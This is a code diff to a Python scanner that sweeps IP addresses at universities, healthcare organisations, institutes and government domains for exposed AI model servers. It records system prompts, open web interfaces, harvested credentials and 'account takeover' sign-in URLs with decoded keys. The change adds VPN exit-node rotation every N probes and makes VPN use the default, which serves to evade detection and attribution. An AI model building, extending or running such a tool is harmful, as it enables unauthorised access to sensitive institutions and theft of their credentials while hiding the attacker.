@@ -765,12 +765,60 @@ def export_markdown(state):
 
 # ── Main ──────────────────────────────────────────────────────────────────────
 
-def run_scan(state, targets, reprobe, university_mode=False, healthcare_mode=False, institute_mode=False, government_mode=False):
+def _probe_batch(batch, state, university_mode, healthcare_mode, institute_mode, government_mode):
+    """Run one batch of probes concurrently, return (live_count, takeover_list)."""
+    live = 0
+    takeovers = []
+    with ThreadPoolExecutor(max_workers=20) as ex:
+        futures = {
+            ex.submit(probe_ip, ip, org, hn, university_mode, healthcare_mode, institute_mode, government_mode, tld_cc): (ip, org, hn)
+            for ip, org, hn, tld_cc in batch
+        }
+        for f in as_completed(futures):
+            ip, org, hn = futures[f]
+            try:
+                result = f.result()
+                if result:
+                    merge(state, result)
+                    live += 1
+                    tags = ""
+                    if result["cloud_proxy"]:      tags += " [CLOUD]"
+                    if result["account_takeover"]: tags += " [TAKEOVER!]"
+                    if result["creds"]:            tags += f" [CREDS:{len(result['creds'])}]"
+                    if result.get("webui", {}) and result["webui"].get("auth_disabled"):
+                        tags += " [WEBUI-OPEN]"
+                    if result.get("medical_models"):
+                        tags += f" [MEDICAL:{len(result['medical_models'])}]"
+                    sysp = sum(1 for v in result["system_prompts"].values() if v)
+                    label = (result.get("institution")
+                             or result.get("org_type")
+                             or result.get("gov_tier")
+                             or "")
+                    inst = f"  {label}" if label else ""
+                    print(f"  [+] {ip:20s}  {org[:24]:24s}  "
+                          f"v={result['version']}  models={len(result['models'])}"
+                          f"  sys={sysp}{tags}{inst}")
+                    if result["account_takeover"]:
+                        takeovers.append(result)
+                        print(f"  [!!!] SIGNIN URL: {result['signin_url']}")
+                        if result.get("signin_key_decoded"):
+                            print(f"  [!!!] KEY: {result['signin_key_decoded']}")
+                else:
+                    mark_dead(state, ip, org, hn)
+                    print(f"  [-] {ip}")
+            except Exception as e:
+                mark_dead(state, ip, org, hn)
+                print(f"  [!] {ip}: {e}")
+    return live, takeovers
+
+
+def run_scan(state, targets, reprobe, university_mode=False, healthcare_mode=False,
+             institute_mode=False, government_mode=False,
+             rotate_every=0, vpn_target_country=None):
     """Shared probe loop used by all sweep modes."""
     to_probe = []
     skipped_dead = skipped_fresh = 0
     for row in targets:
-        # Support both (ip, org, hn) and (ip, org, hn, tld_cc) tuples
         ip, org, hn = row[0], row[1], row[2]
         tld_cc = row[3] if len(row) > 3 else None
         entry = state.get(ip)
@@ -791,45 +839,23 @@ def run_scan(state, targets, reprobe, university_mode=False, healthcare_mode=Fal
     live_this_run = 0
     takeover_this_run = []
 
-    with ThreadPoolExecutor(max_workers=20) as ex:
-        futures = {
-            ex.submit(probe_ip, ip, org, hn, university_mode, healthcare_mode, institute_mode, government_mode, tld_cc): (ip, org, hn)
-            for ip, org, hn, tld_cc in to_probe
-        }
-        for f in as_completed(futures):
-            ip, org, hn = futures[f]
+    # Split into batches for VPN rotation (or one batch if rotation disabled)
+    batch_size = rotate_every if rotate_every > 0 else len(to_probe)
+    batches = [to_probe[i:i+batch_size] for i in range(0, len(to_probe), batch_size)]
+
+    for batch_num, batch in enumerate(batches):
+        if batch_num > 0 and rotate_every > 0 and VPN_AVAILABLE:
+            print(f"[vpn] Rotating exit node after batch {batch_num}...")
             try:
-                result = f.result()
-                if result:
-                    merge(state, result)
-                    live_this_run += 1
-                    tags = ""
-                    if result["cloud_proxy"]:      tags += " [CLOUD]"
-                    if result["account_takeover"]: tags += " [TAKEOVER!]"
-                    if result["creds"]:            tags += f" [CREDS:{len(result['creds'])}]"
-                    if result.get("webui", {}) and result["webui"].get("auth_disabled"):
-                        tags += " [WEBUI-OPEN]"
-                    if result.get("medical_models"):
-                        tags += f" [MEDICAL:{len(result['medical_models'])}]"
-                    sysp = sum(1 for v in result["system_prompts"].values() if v)
-                    label = (result.get("institution")
-                             or result.get("org_type")
-                             or "")
-                    inst = f"  {label}" if label else ""
-                    print(f"  [+] {ip:20s}  {org[:24]:24s}  "
-                          f"v={result['version']}  models={len(result['models'])}"
-                          f"  sys={sysp}{tags}{inst}")
-                    if result["account_takeover"]:
-                        takeover_this_run.append(result)
-                        print(f"  [!!!] SIGNIN URL: {result['signin_url']}")
-                        if result.get("signin_key_decoded"):
-                            print(f"  [!!!] KEY: {result['signin_key_decoded']}")
-                else:
-                    mark_dead(state, ip, org, hn)
-                    print(f"  [-] {ip}")
+                _vpn.rotate(target_country=vpn_target_country)
             except Exception as e:
-                mark_dead(state, ip, org, hn)
-                print(f"  [!] {ip}: {e}")
+                print(f"[vpn] Rotation failed: {e} — continuing with current exit")
+
+        live, takeovers = _probe_batch(
+            batch, state, university_mode, healthcare_mode, institute_mode, government_mode
+        )
+        live_this_run   += live
+        takeover_this_run.extend(takeovers)
 
     return live_this_run, takeover_this_run
 
@@ -849,12 +875,14 @@ def main():
                         help="Run credential hunt on all known cloud proxies in state")
     parser.add_argument("--government", action="store_true",
                         help="Government sweep: TLD-based queries (.gov, .go.id, .gov.br, ...)")
-    parser.add_argument("--vpn-guard",  action="store_true",
-                        help="Require VPN connected before active probing (auto-connects if down)")
-    parser.add_argument("--vpn-strict", action="store_true",
-                        help="Verify exit IP via am.i.mullvad.net before probing (implies --vpn-guard)")
+    parser.add_argument("--no-vpn",      action="store_true",
+                        help="Skip VPN guard (Shodan-only sessions, never for active probing)")
+    parser.add_argument("--vpn-strict",  action="store_true",
+                        help="Verify exit IP via am.i.mullvad.net before probing")
     parser.add_argument("--vpn-country", metavar="CC",
                         help="ISO2 target country for geo-aware VPN exit selection")
+    parser.add_argument("--rotate-every", type=int, default=0, metavar="N",
+                        help="Rotate VPN exit node every N probes (0 = disabled)")
     args = parser.parse_args()
 
     global STATE_FILE, EXPORT_FILE
@@ -871,18 +899,19 @@ def main():
         STATE_FILE  = GOV_STATE_FILE
         EXPORT_FILE = GOV_EXPORT_FILE
 
-    # ── VPN pre-flight ────────────────────────────────────────────────────────
-    need_vpn = args.vpn_guard or args.vpn_strict
-    if need_vpn:
+    # ── VPN pre-flight (ON by default — use --no-vpn only for Shodan-only sessions) ──
+    skip_vpn = getattr(args, 'no_vpn', False)
+    if not skip_vpn:
         if not VPN_AVAILABLE:
-            print("[vpn] ERROR: vpn.py not found — cannot enforce VPN guard", file=sys.stderr)
+            print("[vpn] ERROR: vpn.py not found. Install vpn.py or pass --no-vpn", file=sys.stderr)
             sys.exit(1)
         target_cc = args.vpn_country or None
-        print(f"[vpn] Pre-flight check (strict={args.vpn_strict}, target={target_cc or 'any'})...")
+        strict    = args.vpn_strict
+        print(f"[vpn] Pre-flight (strict={strict}, target={target_cc or 'any'})...")
         s = _vpn.require(
             target_country=target_cc,
             auto_connect=True,
-            abort_if_unverified=args.vpn_strict,
+            abort_if_unverified=strict,
         )
         ip_label = s.get('ip') or '(unverified)'
         server   = s.get('server') or s.get('exit_city') or '?'
@@ -952,6 +981,8 @@ def main():
         healthcare_mode=args.healthcare,
         institute_mode=args.institute,
         government_mode=args.government,
+        rotate_every=args.rotate_every,
+        vpn_target_country=args.vpn_country,
     )
     save_state(state)
 
